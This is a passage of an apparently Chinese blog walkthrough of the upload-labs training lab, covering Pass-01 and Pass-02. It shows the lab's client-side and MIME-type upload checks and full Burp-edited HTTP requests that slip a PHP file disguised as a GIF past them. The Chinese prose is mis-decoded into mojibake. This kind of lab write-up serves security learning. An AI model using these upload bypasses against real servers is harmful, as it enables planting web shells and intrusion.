<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="upload files å­¦ä¹ é¡¹ç›®åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs æµ‹è¯•ç¯å¢ƒ  æ“ä½œç³»ç»Ÿï¼šwindowsphpç‰ˆæœ¬ï¼š5.2.17~7.2.10-nts  Pass-o1å‰ç«¯-jsæ£€æŸ¥    ä¸Šé©¬ï¼Œå¦‚ä¸‹æç¤º    çŒœæµ‹ä¸ºå‰ç«¯æ£€æµ‹ï¼ŒæŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œç™½åå• .jpg|.png|.gif  123456789101112131415161718 function">
<meta property="og:type" content="article">
<meta property="og:title" content="upload-labs">
<meta property="og:url" content="http://example.com/2022/02/28/upload-labs/index.html">
<meta property="og:site_name" content="Imp1ture">
<meta property="og:description" content="upload files å­¦ä¹ é¡¹ç›®åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs æµ‹è¯•ç¯å¢ƒ  æ“ä½œç³»ç»Ÿï¼šwindowsphpç‰ˆæœ¬ï¼š5.2.17~7.2.10-nts  Pass-o1å‰ç«¯-jsæ£€æŸ¥    ä¸Šé©¬ï¼Œå¦‚ä¸‹æç¤º    çŒœæµ‹ä¸ºå‰ç«¯æ£€æµ‹ï¼ŒæŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œç™½åå• .jpg|.png|.gif  123456789101112131415161718 function">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-10-43-51.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-10-52-54.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-10-59-35.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-11-02-07.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-11-13-41.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-11-44-16.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-12-15-57.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-20-09-12.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-18-09-02.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-18-16-23.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-20-29-44.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-22-45-56.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-23-13-35.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-23-20-04.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-23-38-11.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-08-57-48.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-08-59-09.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-18-16-03.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-16-47-24.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-18-11-03.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-18-16-24.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-01-18-16-47.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-02-07-58-21.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-02-08-06-09.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-02-08-04-45.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-08-29-54.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-08-35-09.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-08-40-58.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-12-45-20.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-02-20-02-37.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-16-22-18.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-16-24-08.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-03-16-25-19.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-09-45-13.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-09-47-37.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-11-12-06.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-11-49-17.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-20-22-27.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-20-40-03.png">
<meta property="og:image" content="http://example.com/2022/02/28/upload-labs/2022-03-05-20-40-40.png">
<meta property="article:published_time" content="2022-02-28T13:59:42.000Z">
<meta property="article:modified_time" content="2022-03-05T13:16:32.229Z">
<meta property="article:author" content="Imp1ture">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/02/28/upload-labs/2022-02-28-10-43-51.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>upload-labs</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">é¦–é¡µ</a></li><!--
     --><!--
       --><li><a href="/about/">å…³äº</a></li><!--
     --><!--
       --><li><a href="/archives/">å½’æ¡£</a></li><!--
     --><!--
       --><li><a href="/search/">æœç´¢</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡" href="/2022/03/06/CVE-2007-4556-Struts2-001-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡" href="/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="è¿”å›é¡¶éƒ¨" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº«æ–‡ç« " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">è¿”å›é¡¶éƒ¨</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«æ–‡ç« </span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/28/upload-labs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/28/upload-labs/&text=upload-labs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/28/upload-labs/&is_video=false&description=upload-labs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=upload-labs&body=Check out this article: http://example.com/2022/02/28/upload-labs/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/28/upload-labs/&title=upload-labs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/28/upload-labs/&name=upload-labs&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/28/upload-labs/&t=upload-labs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-files-%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">upload files å­¦ä¹ </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-o1"><span class="toc-number">1.1.</span> <span class="toc-text">Pass-o1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02"><span class="toc-number">1.2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03"><span class="toc-number">1.3.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04"><span class="toc-number">1.4.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05"><span class="toc-number">1.5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06"><span class="toc-number">1.6.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07"><span class="toc-number">1.7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08"><span class="toc-number">1.8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09"><span class="toc-number">1.9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10"><span class="toc-number">1.10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11"><span class="toc-number">1.11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12"><span class="toc-number">1.12.</span> <span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13"><span class="toc-number">1.13.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14"><span class="toc-number">1.14.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15"><span class="toc-number">1.15.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">1.16.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17"><span class="toc-number">1.17.</span> <span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-18"><span class="toc-number">1.18.</span> <span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-19"><span class="toc-number">1.19.</span> <span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-20"><span class="toc-number">1.20.</span> <span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-21"><span class="toc-number">1.21.</span> <span class="toc-text">Pass-21</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        upload-labs
    </h1>



	
    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Imp1ture</span>
      </span>
	  <!--Leancloud é˜…è¯»é‡-->
	  
	<span id="/2022/02/28/upload-labs/" class="leancloud-visitors" data-flag-title="upload-labs">
		<em class="post-meta-item-text">é˜…è¯»é‡</em>
		<i class="leancloud-visitors-count">loading</i>
	</span>



	  
	  <!--Leancloud é˜…è¯»é‡-->
	  
      
    <div class="postdate">
      
        <time datetime="2022-02-28T13:59:42.000Z" itemprop="datePublished">2022-02-28</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="upload-files-å­¦ä¹ "><a href="#upload-files-å­¦ä¹ " class="headerlink" title="upload files å­¦ä¹ "></a>upload files å­¦ä¹ </h1><p>é¡¹ç›®åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<p>æµ‹è¯•ç¯å¢ƒ</p>
<blockquote>
<p>æ“ä½œç³»ç»Ÿï¼šwindows<br>phpç‰ˆæœ¬ï¼š5.2.17~7.2.10-nts</p>
</blockquote>
<h2 id="Pass-o1"><a href="#Pass-o1" class="headerlink" title="Pass-o1"></a>Pass-o1</h2><p><strong>å‰ç«¯-jsæ£€æŸ¥</strong>   </p>
<p>ä¸Šé©¬ï¼Œå¦‚ä¸‹æç¤º</p>
<p> <img src="/2022/02/28/upload-labs/2022-02-28-10-43-51.png"></p>
<p> çŒœæµ‹ä¸ºå‰ç«¯æ£€æµ‹ï¼ŒæŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œç™½åå• <code>.jpg|.png|.gif</code></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‰ç«¯æ£€æµ‹çš„è¯ï¼Œå…³é—­jsè§£æ&#x2F;burpæ”¹åŒ…<br>1ã€å…³é—­jsè§£æ</p>
<p><img src="/2022/02/28/upload-labs/2022-02-28-10-52-54.png"><br>2ã€burpæ”¹åŒ… åœ¨filenameè¯¥æˆéœ€è¦çš„åç¼€å³å¯ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/Pass-01/index.php</span><br><span class="line">Cookie: <span class="keyword">pass</span>=01</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure>

<p>éƒ½å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œç„¶åæ‰¾åˆ°è¹„ç‰‡å³é”®å¤åˆ¶åœ°å€<br><img src="/2022/02/28/upload-labs/2022-02-28-10-59-35.png"><br>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/upload/a.php å³æœ¨é©¬åœ°å€</span><br></pre></td></tr></table></figure>
<p>è®¿é—®ï¼Œä¼ ğŸæˆåŠŸ</p>
<p><img src="/2022/02/28/upload-labs/2022-02-28-11-02-07.png"></p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>æœåŠ¡ç«¯-MIMEæ–‡ä»¶ç±»å‹æ£€æŸ¥</strong></p>
<p>ç›´æ¥ä¸Šé©¬è¢«æ£€æµ‹é”™è¯¯ã€‚<br>æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;02&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>burpæ”¹åŒ…ï¼Œä¿®æ”¹<code>Content-Type</code>ï¼Œéƒ¨åˆ†ä¸º <code>image/jpeg</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-02/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-11-13-41.png"></p>
<p><strong>èƒŒæ™¯çŸ¥è¯†ï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/features.file-upload.post-method.php">POST æ–¹æ³•ä¸Šä¼ </a></p>
<p>å…¨å±€å˜é‡ $_FILES åŒ…å«æœ‰æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ã€‚ æ•°ç»„çš„å†…å®¹æ¥è‡ªä»¥ä¸‹èŒƒä¾‹è¡¨å•ã€‚æˆ‘ä»¬å‡è®¾æ–‡ä»¶ä¸Šä¼ å­—æ®µçš„åç§°å¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼Œä¸º userfileã€‚åç§°å¯éšæ„å‘½åã€‚</p>
<blockquote>
<p><code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>  å®¢æˆ·ç«¯æœºå™¨æ–‡ä»¶çš„åŸåç§°ã€‚  </p>
<p><code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>  æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œå¦‚æœæµè§ˆå™¨æä¾›æ­¤ä¿¡æ¯çš„è¯ã€‚ä¸€ä¸ªä¾‹å­æ˜¯â€œimage&#x2F;gifâ€ã€‚ä¸è¿‡æ­¤ MIME ç±»å‹åœ¨ PHP ç«¯å¹¶ä¸æ£€æŸ¥ï¼Œå› æ­¤ä¸è¦æƒ³å½“ç„¶è®¤ä¸ºæœ‰è¿™ä¸ªå€¼ã€‚  </p>
<p><code>$_FILES[&#39;userfile&#39;][&#39;size&#39;]</code>  å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚</p>
<p><code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code> æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚</p>
<p><code>$_FILES[&#39;userfile&#39;][&#39;error&#39;]</code>   è¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚</p>
</blockquote>
